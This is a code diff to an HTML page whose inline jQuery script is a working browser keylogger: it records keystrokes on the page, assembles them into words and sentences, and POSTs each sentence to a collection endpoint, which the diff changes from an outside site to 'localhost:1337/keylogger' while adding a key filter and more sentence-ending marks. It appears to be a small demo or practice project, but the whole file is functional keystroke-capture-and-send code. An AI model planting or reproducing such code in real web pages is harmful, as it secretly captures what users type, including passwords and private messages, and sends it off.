@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -8,34 +9,37 @@
     <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script>
+        const endOfSentence = ['.', '!', '?']
         var keys = [];
         var words = [];
-        $(document).on('keydown', (e) => {
+        $(document).on('keydown', e => {
+            if (!isKeyImportant(e.keyCode))
+                return;
             let key = e.originalEvent.key;
             keys.push(key);
-            if(key === ' '){
+            if (key === ' ') {
                 finishedWord();
             }
-            if(key === '.'){
+            if (endOfSentence.indexOf(key) != -1) {
                 finishedWord();
                 finishedSentence();
             }
         })
-        function finishedWord(){
+        function finishedWord() {
             let word = keys.join('');
             console.log("FINISHED WORD!", word);
             words.push(word);
             keys.length = 0;
         }
-        function finishedSentence(){
+        function finishedSentence() {
             var sentence = words.join('');
             words.length = 0;
             console.log("FINISHED SENTENCE!", sentence);
             sendData(sentence);
         }
-        function sendData(sentence){
+        function sendData(sentence) {
             $.ajax({
-                url: 'meineSeite.ch',
+                url: 'http://localhost:1337/keylogger',
                 method: 'POST',
                 data: {
                     sentence
@@ -45,9 +49,19 @@
                 }
             })
         }
+        function isKeyImportant(keyCode) {
+            return (keyCode > 47 && keyCode < 58) || // number keys
+                keyCode == 32 || // spacebar
+                (keyCode > 64 && keyCode < 91) || // letter keys
+                (keyCode > 95 && keyCode < 112) || // numpad keys
+                (keyCode > 185 && keyCode < 193) || // ;=,-./` (in order)
+                (keyCode > 218 && keyCode < 223);   // [\]' (in order)
+        }
     </script>
 </head>
+
 <body>
-    
+
 </body>
+
 </html>
